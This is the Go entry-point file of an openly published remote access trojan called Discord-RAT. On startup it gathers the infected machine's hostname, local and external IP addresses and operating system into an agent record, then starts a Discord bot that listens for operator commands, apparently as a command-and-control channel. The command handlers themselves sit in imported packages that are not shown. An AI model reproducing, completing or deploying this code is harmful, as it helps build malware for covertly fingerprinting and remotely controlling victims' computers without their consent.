/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package main

import (
	"os"
	"runtime"

	"github.com/codeuk/discord-rat/cmd/bot"
	"github.com/codeuk/discord-rat/pkg/agent"
	"github.com/codeuk/discord-rat/pkg/agent/system"
)

var newAgent *agent.Agent

// Create an Agent with all the necessary information
func init() {
	newAgent = &agent.Agent{}
	newAgent.HostName, _ = os.Hostname()
	newAgent.LocalIP = system.GetLocalIP()
	newAgent.ExternalIP = system.GetExternalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows" {
		sys = "Windows"
	} else if runtime.GOOS == "linux" {
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"
	}

	newAgent.OS = sys
}

func main() {
	// Initialize the Discord Bot and Session and listen for commands.
	bot.Init(newAgent)
}
